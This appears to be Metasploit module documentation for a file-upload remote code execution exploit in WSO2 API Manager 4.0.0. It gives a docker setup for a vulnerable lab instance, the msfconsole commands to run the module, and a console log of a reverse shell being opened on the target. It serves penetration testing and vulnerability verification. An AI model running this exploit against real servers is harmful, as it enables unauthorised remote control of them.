## Vulnerable Application

A vulnerability in the 'Add API Documentation' feature allows malicious users with specific permissions
(`/permission/admin/login` and `/permission/admin/manage/api/publish`) to upload arbitrary files to a user-controlled
server location. This flaw could be exploited to execute remote code, enabling an attacker to gain control over the server.

```yaml
services:
  api-manager:
    image: wso2/wso2am:4.0.0-alpine
    container_name: swo2_api_manager
    ports:
      - "9443:9443"

```

```bash
docker-compose up
```
## Verification Steps

1. Install the application
1. Start msfconsole
1. Do: `use multi/http/wso2_api_manager_file_upload_rce`
1. Do: `set rhosts [ip]`
1. Do: `set lhost [ip]`
1. Do: `run`
1. You should get a shell.

## Scenarios

### WSO2 API Manager 4.0.0
```
msf6 exploit(multi/http/wso2_api_manager_file_upload_rce) > exploit

[*] Started reverse TCP handler on 0.0.0.0:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Checking target...
[+] Authentication successful
[+] The target appears to be vulnerable. Detected WSO2 API Manager 4.0.0 which is vulnerable.
[+] Authentication successful
[*] Listing APIs...
[+] Document created successfully
[*] Uploading payload...
[+] Payload uploaded successfully
[*] Executing payload... 
[+] Payload executed successfully
[*] Command shell session 2 opened (127.0.0.1:4444 -> 127.0.0.1:58206) at 2024-11-03 15:36:37 +0100

id
uid=802(wso2carbon) gid=802(wso2) groups=802(wso2)
pwd
/home/wso2carbon/wso2am-4.0.0
exit
[*] 127.0.0.1 - Command shell session 2 closed.
```

## Options

### HttpUsername (required)

The username to authenticate with.

### HttpPassword (required)

The password of the user to authenticate with.

### RHOSTS (required)

The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html

### RPORT (required)

The target port (TCP)
